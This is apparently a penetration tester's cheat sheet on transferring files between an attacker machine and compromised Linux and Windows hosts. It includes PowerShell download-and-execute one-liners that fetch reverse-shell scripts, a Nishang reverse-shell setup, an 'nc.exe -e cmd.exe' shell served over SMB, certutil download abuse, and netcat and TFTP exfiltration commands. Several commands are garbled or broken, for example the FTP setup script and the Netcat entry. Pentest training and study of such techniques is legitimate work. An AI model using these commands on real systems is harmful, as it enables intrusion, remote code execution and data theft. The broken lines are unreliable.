- [Linux System](#Linux-System)
  - [wget](#wget)
  - [curl](#curl)
  - [nc](#nc)
  - [tftp](#tftp)
  - [axel](#axel)
  - [metasploit](#metasploit)
  - [php](#php)
  - [scp](#scp)
  - [ssh](#ssh)
  - [python](#python)
  - [apache](#apache)
  - [netcat](#netcat)
  
- [Windows System](#Windows-System)
  - [PowerShell](#PowerShell)
  - [FTP](#FTP)
  - [TFTP](#TFTP)
  - [SMB](#SMB)
  - [Nishang](#Nishang)
  - [Netcat](Netcat)
  - [Meterpreter](#Meterpreter)
  - [Impacket](#Impacket)
  - [Smbserver](#smbserver)
  - [Certutil](#certutil)
  - [Python-ftp](#Python-ftp)
  - [WebRequest](#WebRequest)
 
# Linux 

### wget
```
wget [url/with/file] -p [local/path]
```

### Pure-FTPd
- install Pure-FTPd
```
sudo apt update && sudo apt install pure-ftpd 
```
- create a new user for Pure-FTPd. The following Bash script will automate the user creation.
```
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s .. /conf /PureDB 60pdb
mkd i r -p / f tphome
chown -R ftpuser: f tpgroup /ftphome/
systemctl restart pu re-ftpd
```
- make the script executable
```
> chmod +x setup-ftp.sh
> sudo . /setup-ftp.sh
```

### curl
```
curl -O [url/with/file]
```

### nc
```
- ncat -l  [port] > file.txt
- ncat [ip] [port] --send-only < data.txt
```

### tftp

- service atftpd start
```
tftp [my_server_ip]
tftp > get myFile
OR
tftp [my_server_ip] <<< "get file"
```

### axel
```
transfer file from a FTP or HTTP server through multiple connections.
axel -n 10 --output=axel-test100Mb.db http://speedtest.ftp.otenet.gr/files/test100Mb.db
```

### Metasploit
```
Has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT, which determines which directory to serve up, and OUTPUTPATH if you want to capture TFTP uploads from Windows as well.
```

### php
```
echo "<?php file_put_contents('nameOfFile', fopen('http://[my_server_ip:port/fileName', 'r')); ?>" file_one_server.php
```

### scp 
- copy file
```
scp /your/file/path.ext [name]@[victim_server_ip]:/your/file/destination/path.ext
```
- copy directory
```
scrp -r /your/dir/path [name]@[victim_server_ip]:/your/dir/destination/path
```

### ssh
- Puts file to the attacking machine
```
ssh root@[ip] "cat > proof.txt < proof.txt"
```

- Get files from the attacking machine
```
ssh root@[ip] "cat exploit" > "exploit
```

### python
```
python -m SimpleHTTPServer [port]
```

### apache
- Attacker
````
cp filetosend.txt /var/www/html
service apache2 start
````
- Target
```
wget http://<attackerip>/file
curl http://<attackerip>/file > file
fetch http://<attackerip>/file        # on BSD
```

### netcat
- Attacker
```
nc -lvp 4444 > file
```

- Target
```
nc <attacker_ip> 4444 < file
```

-------------------------------------------------------------------------------------------------------------------------------

# Windows 

## PowerShell

- Download file
```
powershell iex(new-object System.Net.WebClient).DownloadFile('http://[ip]/file.exe','D:\User\name\Desktop\file.exe')

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://[your_ip:port]/wget.exe','C:\Destination\path\wget.exe')"

powershell -c iex(new-object net.webclient).downloadstring('http://[your_ip:port]/Invoke-PowerShellTcp.ps1')
powershell.exe -c iex(new-object net.webclient).downloadstring('http://[your_ip:port]/Invoke-PowerShellTcp.ps1')

powershell -ExecutionPolicy Bypass -File wget.ps1 http://[your_ip:port]/file file

powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('http://[your_ip]:8000/reverse.ps1'); reverse.ps1"
```

- Download file from powershell prompt
```
(new-object System.Net.WebClient).DownloadFile('http://<>your_ip>/file.exe', 'C:\temp\file.exe')
```

- Create powershell file
```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1


powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

- Powershell wget
```
powershell wget http://[your_ip:port]
```

## FTP 
- On linux machine install python-pyftpdlib
```
apt-get install python-pyftpdlib
python -m pyftdlib -p 21
If you want to grant the anonymous user write access, add the -w flag as well.
```

- On windows machine
```
ftp [linux_ip]
binary
get file.exe
```

## TFTP

- On linux machine strt server
```
service atftpd start
```
- On windows machine
```
- tftp -i [linux_ip] GET file.exe
```

## Metasploit 
has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT, which determines which directory to serve up, and OUTPUTPATH if you want to capture TFTP uploads from Windows as well.


Exfiltrating files via TFTP is simple as well with the PUT action. The Metasploit server saves them in /tmp by default
- tftp -i linux-ip PUT file.txt

## SMB

- In linux machine, download smbserver.py from impacket project https://github.com/SecureAuthCorp/impacket
```
python smbserver.py ROPNOP /root/shells
```

- In windows machine
```
- dir \\[linux_ip]\ROPNOP
- copy \\[linux_ip]\ROPNOP\file.exe
```

## Nishang
- git clone [Nishang](https://github.com/samratashok/nishang)
- edit InvokePowerShellTcp.ps1 /nishang/Shells/
paste *Invoke-PowerShellTcp -Reverse -IPAddress [your_ip] -Port [your_port]* on bottom of the file.
- run python HTTP server
  -python -m SimpleHTTPServer 443
  -python3 -m http.server 443
-In the victim shell: 
  powershell iex(new-object net.webclient).downloadstring('http://[your_ip:port]/Invoke-PowerShellTcp.ps1')
  
## Netcat
```
cmd.exe [your_ip]
```

## Impacket 
- https://github.com/SecureAuthCorp/impacket

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

## smbserver

- On linux machine download smbserver.py
```
git clone [impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)
```

- Create directory on linux machine (for example test)
```
cp nc.exe to your_file_directory_path
```

- On linux machine run smbserver
```
python smbserver.py test your_file_directory_path (example: python smbserver.py test /root/mysmbfile
```

- Run nc on linux machine 
```
nc -lnvp 443
```

- On windows machine 
```
\\[your_ip]\test\nc.exe -e cmd.exe [your_ip]
```

## certutil

```
certutil -urlcache -f http://[your_ip]/file output_file_name
certutil -urlcache -split -f http://[your_ip]/file output_file_name
```

## Python-ftp
- install 
```
pip3 install pyftpdlib
```
- run
```
python -m pyftpdlib -p 21 --write
```
- on widnows machine 
```
ftp <your server ip> 
login: anonymous
password: anonymous
```
- Get file
```
get file_name
```
- Put file
```
put file_name
```

## WebRequest
```
Invoke-WebRequest "http://[your_ip]/file output_file_name" -OutFile "c:\"
```


